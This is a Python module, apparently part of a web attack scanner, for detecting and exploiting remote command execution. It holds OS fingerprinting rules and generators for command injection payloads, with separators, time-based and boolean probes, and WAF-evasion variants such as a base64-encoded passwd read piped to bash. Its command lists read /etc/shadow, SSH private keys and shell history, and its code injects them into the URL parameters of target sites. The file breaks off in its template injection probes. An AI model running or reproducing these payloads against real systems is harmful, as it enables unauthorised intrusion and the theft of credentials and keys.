"""RCE detection and exploitation module."""

import re
import time
import random
import base64
import statistics
import hashlib
import hmac
import json
import socket
import struct
import platform
import subprocess
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from typing import Optional, Dict, List, Tuple, Any, Set, Callable
from dataclasses import dataclass, field
from enum import Enum, auto
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from collections import defaultdict, Counter
from core.vuln_types import VT
import logging
import warnings
from abc import ABC, abstractmethod
from datetime import datetime
import html
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')

logger = logging.getLogger(__name__)


# ENUMERATIONS

class OS(Enum):
    """Operating System enumeration with confidence scoring"""
    LINUX = auto()
    WINDOWS = auto()
    MACOS = auto()
    BSD = auto()
    SOLARIS = auto()
    AIX = auto()
    UNKNOWN = auto()


class RCETechnique(Enum):
    """RCE technique types"""
    COMMAND_INJECTION = "command_injection"
    BLIND_COMMAND_INJECTION = "blind_command"
    TIME_BASED_COMMAND = "time_based_command"
    OUT_OF_BAND_COMMAND = "oob_command"
    BOOLEAN_BASED_COMMAND = "boolean_based_command"
    ERROR_BASED_COMMAND = "error_based_command"
    PHP_DESERIALIZATION = "php_deserialization"
    PYTHON_PICKLE = "python_pickle"
    JAVA_DESERIALIZATION = "java_deserialization"
    DOTNET_DESERIALIZATION = "dotnet_deserialization"
    RUBY_DESERIALIZATION = "ruby_deserialization"
    SSTI = "server_side_template_injection"
    CODE_INJECTION = "code_injection"
    EVAL_INJECTION = "eval_injection"
    FILE_INCLUSION_RCE = "lfi_rce"
    XXE_RCE = "xxe_rce"


class InjectionContext(Enum):
    """Command injection context"""
    DIRECT = "direct"
    SEMICOLON = "semicolon"
    PIPE = "pipe"
    BACKTICK = "backtick"
    SUBSHELL = "subshell"
    AND = "and"
    OR = "or"
    NEWLINE = "newline"
    COMMENT = "comment"


@dataclass
class RCEVulnerability:
    """RCE vulnerability data structure"""
    url: str
    parameter: str
    technique: RCETechnique
    os: OS
    payload: str
    confidence: float
    exploitable: bool
    metadata: Dict = field(default_factory=dict)
    command_output: str = ""
    injection_context: InjectionContext = InjectionContext.DIRECT
    bypass_techniques: List[str] = field(default_factory=list)
    verification_results: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        _SEVERITY = {
            RCETechnique.COMMAND_INJECTION:       ("Critical", 10.0),
            RCETechnique.BLIND_COMMAND_INJECTION: ("Critical", 9.8),
            RCETechnique.TIME_BASED_COMMAND:      ("Critical", 9.5),
            RCETechnique.SSTI:                    ("Critical", 9.8),
            RCETechnique.CODE_INJECTION:          ("Critical", 9.8),
            RCETechnique.EVAL_INJECTION:          ("Critical", 9.8),
            RCETechnique.OUT_OF_BAND_COMMAND:     ("Critical", 9.3),
        }
        severity, cvss = _SEVERITY.get(self.technique, ("High", 9.0))
        return {
            'type':                  f"RCE ({self.technique.value})",
            'technique':             self.technique.value,
            'url':                   self.url,
            'parameter':             self.parameter,
            'os':                    self.os.name,
            'payload':               self.payload[:200],
            'confidence':            self.confidence,
            'exploitable':           self.exploitable,
            'severity':              severity,
            'cvss':                  cvss,
            'metadata':              self.metadata,
            'command_output_preview':self.command_output[:500] if self.command_output else "",
            'injection_context':     self.injection_context.value,
            'bypass_techniques':     self.bypass_techniques,
            'category':              VT.RCE,
        }


# OS FINGERPRINTER - Advanced detection with scoring

class OSFingerprinter:
    """
    Advanced OS fingerprinting with multi-indicator scoring
    Reduces false positives by requiring multiple indicators
    """
    
    LINUX_INDICATORS = {
        'high_confidence': [
            (r'uid=\d+\([^)]+\) gid=\d+\([^)]+\)', 10),
            (r'/bin/bash', 8),
            (r'/bin/sh', 7),
            (r'/usr/bin', 6),
            (r'Linux version', 10),
            (r'GNU/Linux', 9),
            (r'x86_64 GNU/Linux', 8),
            (r'i686 GNU/Linux', 7),
            (r'el[6-9]\.x86_64', 8),  # RHEL/CentOS
            (r'Ubuntu', 7),
            (r'Debian', 7),
            (r'CentOS', 7),
            (r'Fedora', 7),
        ],
        'medium_confidence': [
            (r'root:', 5),
            (r'daemon:', 5),
            (r'bin:', 4),
            (r'sys:', 4),
            (r'sync:', 4),
            (r'games:', 4),
            (r'man:', 4),
            (r'lp:', 4),
            (r'mail:', 4),
            (r'news:', 4),
            (r'uucp:', 4),
            (r'proxy:', 4),
            (r'www-data:', 5),
            (r'backup:', 4),
            (r'list:', 4),
            (r'irc:', 4),
            (r'gnats:', 4),
            (r'nobody:', 4),
            (r'systemd-network:', 4),
            (r'systemd-resolve:', 4),
            (r'messagebus:', 4),
            (r'systemd-timesync:', 4),
            (r'sshd:', 4),
            (r'eth0', 5),
            (r'lo:', 4),
            (r'inet ', 4),
            (r'inet6', 4),
            (r'RX packets', 4),
            (r'TX packets', 4),
            (r'/proc/', 6),
            (r'/sys/', 6),
            (r'/dev/', 5),
            (r'drwx', 5),
            (r'-rw-r--r--', 4),
            (r'lrwxrwxrwx', 4),
            (r'total \d+', 4),
            (r'bytes free', 3),
        ],
        'low_confidence': [
            (r'Linux', 3),
            (r'GNU', 2),
            (r'uname', 2),
            (r'kernel', 2),
        ]
    }
    
    WINDOWS_INDICATORS = {
        'high_confidence': [
            (r'Windows IP Configuration', 10),
            (r'Microsoft Windows \[Version', 10),
            (r'Copyright \(c\) Microsoft Corporation', 9),
            (r'C:\\Users\\', 8),
            (r'C:\\Windows\\', 8),
            (r'C:\\Program Files', 7),
            (r'C:\\Program Files \(x86\)', 7),
            (r'Volume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}', 8),
            (r'Directory of C:\\', 7),
            (r'<DIR>\s+\.', 6),
            (r'<DIR>\s+\.\.', 6),
            (r'0 File\(s\)', 5),
            (r'0 Dir\(s\)', 5),
            (r'bytes free', 4),
            (r'System32', 7),
            (r'syswow64', 6),
        ],
        'medium_confidence': [
            (r'Ethernet adapter', 7),
            (r'Wireless LAN adapter', 7),
            (r'IPv4 Address', 6),
            (r'Subnet Mask', 5),
            (r'Default Gateway', 5),
            (r'Physical Address', 5),
            (r'DHCP Enabled', 4),
            (r'Autoconfiguration Enabled', 4),
            (r'Media State', 4),
            (r'Connection-specific DNS Suffix', 4),
            (r'win.ini', 6),
            (r'system.ini', 6),
            (r'BOOT.INI', 5),
            (r'All Users', 4),
            (r'Default User', 4),
            (r'LOCAL SERVICE', 4),
            (r'NETWORK SERVICE', 4),
            (r'Administrator', 4),
            (r'Guest', 3),
            (r'HelpAssistant', 3),
            (r'SUPPORT_388945a0', 3),
        ],
        'low_confidence': [
            (r'Windows', 2),
            (r'Microsoft', 2),
            (r'Win32', 2),
            (r'win32', 2),
            (r'WIN', 1),
        ]
    }
    
    MACOS_INDICATORS = {
        'high_confidence': [
            (r'Darwin Kernel Version', 10),
            (r'Mac OS X', 9),
            (r'macOS', 9),
            (r'Apple Inc\. build', 8),
            (r'IOKit', 7),
            (r'IOACPI', 6),
            (r'/System/Library/', 8),
            (r'/Library/', 6),
            (r'/Applications/', 5),
            (r'/Users/', 5),
        ],
        'medium_confidence': [
            (r'Apple', 5),
            (r'OSX', 4),
            (r'Macintosh', 4),
            (r'i386', 3),
            (r'x86_64', 2),
            (r'ARM64', 3),
            (r'M1', 4),
            (r'M2', 4),
        ],
    }
    
    BSD_INDICATORS = {
        'high_confidence': [
            (r'FreeBSD', 10),
            (r'OpenBSD', 10),
            (r'NetBSD', 10),
            (r'DragonFly', 9),
            (r'pc-bSD', 8),
            (r'/usr/local/etc/', 6),
            (r'/usr/pkg/', 5),
        ],
    }
    
    @classmethod
    def identify(cls, response_text: str) -> Tuple[OS, Dict[str, Any]]:
        """
        Identify OS from command output with detailed scoring
        
        Returns:
            Tuple of (OS, scoring_details)
        """
        if not response_text:
            return OS.UNKNOWN, {'error': 'Empty response'}
        
        scores = {
            OS.LINUX: 0,
            OS.WINDOWS: 0,
            OS.MACOS: 0,
            OS.BSD: 0,
            OS.SOLARIS: 0,
            OS.AIX: 0,
        }
        
        matched_indicators = defaultdict(list)
        
        # Score Linux indicators
        for indicator, score in cls.LINUX_INDICATORS['high_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.LINUX] += score
                matched_indicators['linux_high'].append(indicator)
        
        for indicator, score in cls.LINUX_INDICATORS['medium_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.LINUX] += score
                matched_indicators['linux_medium'].append(indicator)
        
        for indicator, score in cls.LINUX_INDICATORS['low_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.LINUX] += score
                matched_indicators['linux_low'].append(indicator)
        
        # Score Windows indicators
        for indicator, score in cls.WINDOWS_INDICATORS['high_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.WINDOWS] += score
                matched_indicators['windows_high'].append(indicator)
        
        for indicator, score in cls.WINDOWS_INDICATORS['medium_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.WINDOWS] += score
                matched_indicators['windows_medium'].append(indicator)
        
        for indicator, score in cls.WINDOWS_INDICATORS['low_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.WINDOWS] += score
                matched_indicators['windows_low'].append(indicator)
        
        # Score macOS indicators
        for indicator, score in cls.MACOS_INDICATORS['high_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.MACOS] += score
                matched_indicators['macos_high'].append(indicator)
        
        for indicator, score in cls.MACOS_INDICATORS['medium_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.MACOS] += score
                matched_indicators['macos_medium'].append(indicator)
        
        # Score BSD indicators
        for indicator, score in cls.BSD_INDICATORS['high_confidence']:
            if re.search(indicator, response_text, re.IGNORECASE):
                scores[OS.BSD] += score
                matched_indicators['bsd_high'].append(indicator)
        
        # Check for Solaris/AIX
        if re.search(r'SunOS|Solaris', response_text, re.IGNORECASE):
            scores[OS.SOLARIS] = 10
            matched_indicators['solaris'].append('SunOS/Solaris detected')
        
        if re.search(r'AIX|IBM', response_text, re.IGNORECASE):
            scores[OS.AIX] = 10
            matched_indicators['aix'].append('AIX/IBM detected')
        
        # Determine winner with confidence threshold
        max_score = max(scores.values())
        winning_os = OS.UNKNOWN
        
        # Require minimum score threshold to avoid false positives
        MIN_CONFIDENCE_THRESHOLD = 15
        
        if max_score >= MIN_CONFIDENCE_THRESHOLD:
            for os_type, score in scores.items():
                if score == max_score:
                    winning_os = os_type
                    break
        
        # Calculate confidence percentage
        total_possible = 100  # Normalized max score
        confidence = min(1.0, max_score / total_possible)
        
        scoring_details = {
            'scores': dict(scores),
            'max_score': max_score,
            'confidence': confidence,
            'matched_indicators': dict(matched_indicators),
            'threshold_met': max_score >= MIN_CONFIDENCE_THRESHOLD,
        }
        
        return winning_os, scoring_details
    
    @classmethod
    def is_likely_linux(cls, response_text: str) -> bool:
        """Quick check if response is likely Linux"""
        os_detected, details = cls.identify(response_text)
        return os_detected == OS.LINUX and details['confidence'] > 0.5
    
    @classmethod
    def is_likely_windows(cls, response_text: str) -> bool:
        """Quick check if response is likely Windows"""
        os_detected, details = cls.identify(response_text)
        return os_detected == OS.WINDOWS and details['confidence'] > 0.5


# COMMAND PAYLOAD GENERATOR - Comprehensive payload generation

class CommandPayloadGenerator:
    """
    Comprehensive command injection payload generator
    Generates payloads for different OS, contexts, and bypass techniques
    """
    
    # Linux command categories
    LINUX_COMMANDS = {
        'identification': [
            'whoami',
            'id',
            'uname -a',
            'hostname',
            'cat /etc/hostname',
            'cat /proc/version',
            'lsb_release -a',
            'cat /etc/os-release',
        ],
        'file_read': [
            'cat /etc/passwd',
            'head -5 /etc/passwd',
            'cat /etc/hosts',
            'cat /etc/shadow 2>/dev/null',
            'cat /proc/self/environ',
            'cat /proc/version',
            'ls -la /etc/',
            'cat ~/.bash_history',
            'cat ~/.ssh/id_rsa',
        ],
        'directory': [
            'pwd',
            'ls -la',
            'ls -la /',
            'ls -la /home/',
            'find / -maxdepth 1 -type d 2>/dev/null',
            'tree -L 1 /',
        ],
        'network': [
            'ifconfig',
            'ip addr',
            'ip route',
            'netstat -an',
            'ss -tulpn',
            'cat /etc/hosts',
            'cat /etc/resolv.conf',
            'dig google.com',
            'nslookup google.com',
        ],
        'process': [
            'ps aux',
            'ps -ef',
            'top -b -n 1',
            'pgrep -a .',
            'lsof -i',
            'netstat -tulpn',
        ],
        'time_delay': [
            'sleep 5',
            'sleep 10',
            'ping -c 5 127.0.0.1',
            'ping -c 10 127.0.0.1',
        ],
        'boolean_true': [
            'test 1',
            'true',
            '[ 1 = 1 ]',
            'test -f /etc/passwd',
        ],
        'boolean_false': [
            'test 0',
            'false',
            '[ 1 = 2 ]',
            'test -f /nonexistent_file_12345',
        ],
    }
    
    # Windows command categories
    WINDOWS_COMMANDS = {
        'identification': [
            'whoami',
            'whoami /all',
            'hostname',
            'systeminfo',
            'ver',
            'echo %USERNAME%',
            'echo %COMPUTERNAME%',
        ],
        'file_read': [
            'type C:\\Windows\\win.ini',
            'type C:\\boot.ini',
            'type C:\\Windows\\System32\\drivers\\etc\\hosts',
            'dir C:\\Users\\',
            'type C:\\Users\\Administrator\\Desktop\\*.txt',
        ],
        'directory': [
            'dir',
            'cd',
            'dir C:\\',
            'dir C:\\Users\\',
            'dir C:\\Program Files\\',
            'tree /F /A',
        ],
        'network': [
            'ipconfig /all',
            'ipconfig',
            'netstat -an',
            'route print',
            'arp -a',
            'nslookup google.com',
        ],
        'process': [
            'tasklist',
            'tasklist /v',
            'tasklist /svc',
            'wmic process list',
            'wmic process get name,processid',
        ],
        'time_delay': [
            'timeout 5',
            'timeout /t 5',
            'ping -n 5 127.0.0.1',
            'ping -n 10 127.0.0.1',
            'choice /t 5 /d y',
        ],
        'boolean_true': [
            'ver',
            'echo ok',
            'dir C:\\',
        ],
        'boolean_false': [
            'dir C:\\nonexistent_directory_12345\\',
            'type C:\\nonexistent_file_12345.txt',
        ],
    }
    
    # Injection separators by OS
    SEPARATORS = {
        'linux': [
            (';', InjectionContext.SEMICOLON),
            ('|', InjectionContext.PIPE),
            ('||', InjectionContext.OR),
            ('&&', InjectionContext.AND),
            ('`', InjectionContext.BACKTICK),
            ('$(', InjectionContext.SUBSHELL),
            ('\n', InjectionContext.NEWLINE),
            ('%0a', InjectionContext.NEWLINE),
            ('%0d%0a', InjectionContext.NEWLINE),
            (';', InjectionContext.DIRECT),
        ],
        'windows': [
            ('&', InjectionContext.DIRECT),
            ('|', InjectionContext.PIPE),
            ('||', InjectionContext.OR),
            ('&&', InjectionContext.AND),
            ('\n', InjectionContext.NEWLINE),
            ('%0a', InjectionContext.NEWLINE),
            ('%0d%0a', InjectionContext.NEWLINE),
            ('^', InjectionContext.COMMENT),
        ],
    }
    
    # Bypass techniques for WAF/IDS evasion
    BYPASS_TECHNIQUES = {
        'space_replacement': ['${IFS}', '\t', '\n', '<>', '%20', '+'],
        'command_concatenation': ['\\x63\\x61\\x74', 'c''at', 'cat<>file', 'cat</etc/passwd'],
        'case_variation': ['CAT', 'Cat', 'cAt', 'caT', 'CAT /etc/passwd'],
        'comment_injection': ['cat /etc/passwd # comment', 'cat /etc/passwd -- -'],
        'null_byte': ['cat /etc/passwd%00', 'cat /etc/passwd\x00'],
        'double_encoding': ['%2527', '%253B', '%257C'],
        'unicode_encoding': ['\\u0063\\u0061\\u0074'],
        'hex_encoding': ['0x63 0x61 0x74'],
        'base64_command': ['echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash'],
        'reverse_base64': ['echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh'],
    }
    
    def __init__(self, os: OS = OS.UNKNOWN):
        self.os = os
        self._cache = {}
    
    def get_commands(self, category: str) -> List[str]:
        """Get commands for category based on detected OS"""
        if self.os == OS.WINDOWS:
            return self.WINDOWS_COMMANDS.get(category, [])
        else:
            return self.LINUX_COMMANDS.get(category, [])
    
    def generate_basic_payloads(self, command: str) -> List[Tuple[str, InjectionContext]]:
        """Generate basic injection payloads with context"""
        payloads = []
        
        separators = self.SEPARATORS['linux'] if self.os != OS.WINDOWS else self.SEPARATORS['windows']
        
        for sep, context in separators:
            # Basic injection
            payloads.append((f"{sep}{command}", context))
            payloads.append((f"{sep} {command}", context))
            
            # Quoted variations
            payloads.append((f"' {sep} {command} '", context))
            payloads.append((f'" {sep} {command} "', context))
            
            # Backtick/subshell
            if context in [InjectionContext.BACKTICK, InjectionContext.SUBSHELL]:
                payloads.append((f"`{command}`", context))
                payloads.append((f"$({command})", context))
        
        return list(set(payloads))
    
    def generate_bypass_payloads(self, command: str) -> List[Tuple[str, str]]:
        """Generate WAF/IDS bypass payloads"""
        payloads = []
        base_cmd = command.split()[0] if command else 'id'
        
        # Space replacement
        for replacement in self.BYPASS_TECHNIQUES['space_replacement']:
            cmd_parts = command.split()
            if len(cmd_parts) > 1:
                bypassed = replacement.join(cmd_parts)
                payloads.append((bypassed, 'space_replacement'))
        
        # Case variation
        payloads.append((command.upper(), 'case_upper'))
        payloads.append((command.lower(), 'case_lower'))
        payloads.append((''.join(c.upper() if random.random() > 0.5 else c.lower() for c in command), 'case_random'))
        
        # Comment injection
        payloads.append((f"{command} # comment", 'comment'))
        payloads.append((f"{command} -- -", 'comment'))
        payloads.append((f"{command} /* comment */", 'comment'))
        
        payloads.append((f"{command}%00", 'null_byte'))
        payloads.append((f"{command}\x00", 'null_byte'))
        
        # Concatenation
        if base_cmd == 'cat':
            payloads.append(('c''at /etc/passwd', 'concatenation'))
            payloads.append(('ca''t /etc/passwd', 'concatenation'))
        
        return list(set(payloads))
    
    def generate_time_based_payloads(self, delay: int = 5) -> Dict[OS, List[Tuple[str, InjectionContext]]]:
        """Generate time-based payloads for all OS"""
        return {
            OS.LINUX: [
                (f"; sleep {delay}", InjectionContext.SEMICOLON),
                (f"| sleep {delay}", InjectionContext.PIPE),
                (f"&& sleep {delay}", InjectionContext.AND),
                (f"`sleep {delay}`", InjectionContext.BACKTICK),
                (f"$(sleep {delay})", InjectionContext.SUBSHELL),
                (f"; ping -c {delay} 127.0.0.1", InjectionContext.SEMICOLON),
                (f"; timeout {delay}", InjectionContext.SEMICOLON),
                (f"\nsleep {delay}\n", InjectionContext.NEWLINE),
            ],
            OS.WINDOWS: [
                (f"& timeout {delay}", InjectionContext.DIRECT),
                (f"| timeout {delay}", InjectionContext.PIPE),
                (f"&& timeout {delay}", InjectionContext.AND),
                (f"& ping -n {delay} 127.0.0.1", InjectionContext.DIRECT),
                (f"; timeout /t {delay}", InjectionContext.DIRECT),
                (f"\ntimeout {delay}\n", InjectionContext.NEWLINE),
            ],
            OS.MACOS: [
                (f"; sleep {delay}", InjectionContext.SEMICOLON),
                (f"| sleep {delay}", InjectionContext.PIPE),
                (f"; ping -c {delay} 127.0.0.1", InjectionContext.SEMICOLON),
            ],
            OS.UNKNOWN: [
                (f"; sleep {delay}", InjectionContext.SEMICOLON),
                (f"& timeout {delay}", InjectionContext.DIRECT),
                (f"| sleep {delay}", InjectionContext.PIPE),
            ],
        }
    
    def generate_boolean_payloads(self) -> Dict[str, List[Tuple[str, str, bool]]]:
        """
        Generate boolean-based payloads
        Returns: Dict of {os: [(true_payload, false_payload, expected_result)]}
        """
        return {
            'linux': [
                ('; test 1', '; test 0', True),
                ('; true', '; false', True),
                ('; [ 1 = 1 ]', '; [ 1 = 2 ]', True),
                ('; test -f /etc/passwd', '; test -f /nonexistent_12345', True),
                ('; [ -f /etc/passwd ]', '; [ -f /nonexistent_12345 ]', True),
            ],
            'windows': [
                ('& ver', '& dir C:\\nonexistent_12345\\', True),
                ('& echo ok', '& type C:\\nonexistent_12345.txt', True),
                ('& dir C:\\', '& dir C:\\nonexistent_12345\\', True),
            ],
        }
    
    def generate_all_payloads(self, command: str = 'id') -> List[Dict]:
        """Generate comprehensive payload list"""
        all_payloads = []
        
        # Basic payloads
        basic = self.generate_basic_payloads(command)
        for payload, context in basic:
            all_payloads.append({
                'payload': payload,
                'type': 'basic',
                'context': context.value,
                'command': command,
            })
        
        # Bypass payloads
        bypass = self.generate_bypass_payloads(command)
        for payload, technique in bypass:
            all_payloads.append({
                'payload': payload,
                'type': 'bypass',
                'technique': technique,
                'command': command,
            })
        
        # Time-based payloads
        time_payloads = self.generate_time_based_payloads(5)
        for os_type, payloads in time_payloads.items():
            for payload, context in payloads:
                all_payloads.append({
                    'payload': payload,
                    'type': 'time_based',
                    'os': os_type.name,
                    'context': context.value,
                    'command': f'sleep/timeout',
                })
        
        return all_payloads


# BLIND DETECTION ENGINE - Statistical analysis for blind RCE

class BlindDetectionEngine:
    """
    Advanced blind command injection detection
    Uses statistical analysis to reduce false positives
    """
    
    def __init__(self, http_engine):
        self.http = http_engine
        self.baseline_cache = {}
        self.stats_cache = {}
    
    def get_baseline(self, url: str, samples: int = 10) -> Dict[str, Any]:
        """
        Get baseline response characteristics
        
        Returns baseline statistics for comparison
        """
        cache_key = f"baseline_{url}_{samples}"
        
        if cache_key in self.baseline_cache:
            return self.baseline_cache[cache_key]
        
        responses = []
        lengths = []
        hashes = []
        times = []
        
        for i in range(samples):
            start = time.time()
            resp = self.http.get(url)
            elapsed = time.time() - start
            
            if resp:
                responses.append(resp)
                lengths.append(len(resp.text))
                hashes.append(hashlib.md5(resp.text.encode()).hexdigest())
                times.append(elapsed)
        
        if not lengths:
            return {'error': 'No responses'}
        
        baseline = {
            'avg_length': statistics.mean(lengths),
            'stdev_length': statistics.stdev(lengths) if len(lengths) > 1 else 0,
            'min_length': min(lengths),
            'max_length': max(lengths),
            'avg_time': statistics.mean(times),
            'stdev_time': statistics.stdev(times) if len(times) > 1 else 0,
            'hash_consistency': len(set(hashes)) == 1,
            'common_hash': Counter(hashes).most_common(1)[0][0] if hashes else None,
            'sample_count': len(responses),
        }
        
        self.baseline_cache[cache_key] = baseline
        return baseline
    
    def test_boolean_condition(self, url: str, param: str, original_value: str,
                               true_payload: str, false_payload: str,
                               samples: int = 5) -> Tuple[bool, Dict]:
        """
        Test boolean-based blind injection
        
        Returns:
            (is_vulnerable, analysis_details)
        """
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        
        baseline = self.get_baseline(url, samples=3)
        if 'error' in baseline:
            return False, {'error': baseline['error']}
        
        true_lengths = []
        false_lengths = []
        true_times = []
        false_times = []
        
        # Test TRUE condition
        for _ in range(samples):
            test_params = params_dict.copy()
            test_params[param] = [original_value + true_payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            start = time.time()
            resp = self.http.get(test_url)
            elapsed = time.time() - start
            
            if resp:
                true_lengths.append(len(resp.text))
                true_times.append(elapsed)
        
        # Test FALSE condition
        for _ in range(samples):
            test_params = params_dict.copy()
            test_params[param] = [original_value + false_payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            start = time.time()
            resp = self.http.get(test_url)
            elapsed = time.time() - start
            
            if resp:
                false_lengths.append(len(resp.text))
                false_times.append(elapsed)
        
        if not true_lengths or not false_lengths:
            return False, {'error': 'Insufficient responses'}
        
        # Statistical analysis
        true_avg = statistics.mean(true_lengths)
        false_avg = statistics.mean(false_lengths)
        
        true_stdev = statistics.stdev(true_lengths) if len(true_lengths) > 1 else 0
        false_stdev = statistics.stdev(false_lengths) if len(false_lengths) > 1 else 0
        
        baseline_avg = baseline['avg_length']
        baseline_stdev = baseline['stdev_length']
        
        # Calculate differences
        true_diff = abs(true_avg - baseline_avg)
        false_diff = abs(false_avg - baseline_avg)
        condition_diff = abs(true_avg - false_avg)
        
        # Determine threshold (dynamic based on baseline variance)
        threshold = max(100, baseline_stdev * 4, 50)
        
        # Analysis criteria
        is_vulnerable = (
            true_diff < threshold and  # TRUE close to baseline
            false_diff > threshold and  # FALSE different from baseline
            condition_diff > threshold  # TRUE and FALSE are different
        )
        
        # Additional confidence factors
        confidence_factors = {
            'true_close_to_baseline': true_diff < threshold,
            'false_far_from_baseline': false_diff > threshold,
            'true_false_different': condition_diff > threshold,
            'true_consistent': true_stdev < threshold / 2,
            'false_consistent': false_stdev < threshold / 2,
        }
        
        confidence_score = sum(confidence_factors.values()) / len(confidence_factors)
        
        analysis = {
            'is_vulnerable': is_vulnerable,
            'confidence': confidence_score,
            'baseline_avg': baseline_avg,
            'baseline_stdev': baseline_stdev,
            'true_avg': true_avg,
            'true_stdev': true_stdev,
            'false_avg': false_avg,
            'false_stdev': false_stdev,
            'true_diff': true_diff,
            'false_diff': false_diff,
            'condition_diff': condition_diff,
            'threshold': threshold,
            'confidence_factors': confidence_factors,
            'samples': {
                'true_count': len(true_lengths),
                'false_count': len(false_lengths),
            }
        }
        
        return is_vulnerable, analysis
    
    def test_time_condition(self, url: str, param: str, original_value: str,
                            time_payload: str, expected_delay: int = 5,
                            samples: int = 3) -> Tuple[bool, Dict]:
        """
        Test time-based blind injection
        
        Returns:
            (is_vulnerable, analysis_details)
        """
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        
        # Get baseline timing
        baseline = self.get_baseline(url, samples=3)
        if 'error' in baseline:
            return False, {'error': baseline['error']}
        
        baseline_avg = baseline['avg_time']
        
        # Test time-based payload
        delay_times = []
        
        for _ in range(samples):
            test_params = params_dict.copy()
            test_params[param] = [original_value + time_payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            start = time.time()
            resp = self.http.get(test_url)
            elapsed = time.time() - start
            
            if resp:
                delay_times.append(elapsed)
        
        if not delay_times:
            return False, {'error': 'No responses'}
        
        delay_avg = statistics.mean(delay_times)
        delay_stdev = statistics.stdev(delay_times) if len(delay_times) > 1 else 0
        
        # Calculate actual delay
        actual_delay = delay_avg - baseline_avg
        
        # Analysis criteria
        is_vulnerable = (
            actual_delay >= (expected_delay - 1.5) and  # Close to expected delay
            delay_stdev < 2.0 and  # Consistent timing
            actual_delay > 3.0  # Significant delay
        )
        
        analysis = {
            'is_vulnerable': is_vulnerable,
            'expected_delay': expected_delay,
            'actual_delay': actual_delay,
            'delay_avg': delay_avg,
            'delay_stdev': delay_stdev,
            'baseline_avg': baseline_avg,
            'samples': delay_times,
            'consistency': delay_stdev < 2.0,
        }
        
        return is_vulnerable, analysis


# VERIFICATION ENGINE - Cross-validation to reduce false positives

class VerificationEngine:
    """
    Multi-method verification to confirm RCE and reduce false positives
    """
    
    VERIFICATION_COMMANDS = {
        'linux': [
            ('id', r'uid=\d+'),
            ('whoami', r'^[a-z]+$'),
            ('uname -a', r'Linux'),
            ('cat /etc/passwd', r'root:'),
            ('hostname', r'^[\w-]+$'),
        ],
        'windows': [
            ('whoami', r'^[\w-]+\\[\w-]+$'),
            ('ver', r'Version'),
            ('hostname', r'^[\w-]+$'),
            ('systeminfo', r'Microsoft Windows'),
            ('dir', r'<DIR>'),
        ],
    }
    
    def __init__(self, http_engine):
        self.http = http_engine
        self.verification_cache = {}
    
    def verify_rce(self, url: str, param: str, original_value: str,
                   base_payload: str, os_type: OS) -> Dict[str, Any]:
        """
        Verify RCE with multiple commands
        
        Returns verification results with confidence scoring
        """
        cache_key = f"{url}_{param}_{base_payload}"
        
        if cache_key in self.verification_cache:
            return self.verification_cache[cache_key]
        
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        
        os_key = 'linux' if os_type == OS.LINUX else 'windows'
        verification_cmds = self.VERIFICATION_COMMANDS.get(os_key, [])
        
        results = {
            'verified': False,
            'successful_verifications': 0,
            'total_verifications': len(verification_cmds),
            'verifications': [],
            'confidence': 0.0,
            'os_confirmed': False,
        }
        
        for command, expected_pattern in verification_cmds:
            test_payload = f";{command}"
            
            test_params = params_dict.copy()
            test_params[param] = [original_value + test_payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            resp = self.http.get(test_url)
            
            if resp and re.search(expected_pattern, resp.text, re.IGNORECASE):
                results['successful_verifications'] += 1
                results['verifications'].append({
                    'command': command,
                    'pattern': expected_pattern,
                    'matched': True,
                })
        
        # Calculate confidence
        if results['total_verifications'] > 0:
            results['confidence'] = results['successful_verifications'] / results['total_verifications']
            results['verified'] = results['confidence'] >= 0.5
            results['os_confirmed'] = results['successful_verifications'] >= 2
        
        self.verification_cache[cache_key] = results
        return results
    
    def verify_with_unique_marker(self, url: str, param: str, original_value: str,
                                   os_type: OS) -> Tuple[bool, str]:
        """Confirm RCE by injecting a unique marker and checking the response."""
        marker = f"EREBUS_{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}"
        sep = "&" if os_type == OS.WINDOWS else ";"
        command = f"echo {marker}"

        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        test_params = params_dict.copy()
        test_params[param] = [original_value + f"{sep}{command}"]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        resp = self.http.get(test_url)
        if resp and marker in resp.text:
            return True, marker
        return False, ""


# SSTI ENGINE — Server-Side Template Injection Detection & Exploitation

class SSTIEngine:
    """
    Detects and exploits SSTI across Jinja2, Twig, Freemarker,
    Velocity, Smarty, Mako, and Pebble engines.
    Uses a polymorphic detection tree to minimize false positives.
    """

    # (payload, expected_output, engine_hint, confidence)
    PROBE_TREE = [
        # Root probes — engine agnostic
        ("{{7*7}}", "49", None, 0.5),
        ("${7*7}", "49", None, 0.5),
        ("#{7*7}", "49", None, 0.5),
        ("<%= 7*7 %>", "49", None, 0.5),
        # Jinja2-specific (string multiplication)
        ("{{7*'7'}}", "7777777", "jinja2", 1.0),
        ("{{config.__class__}}", "Config", "jinja2", 0.9),
        ("{{request.__class__}}", "Request", "jinja2", 0.85),
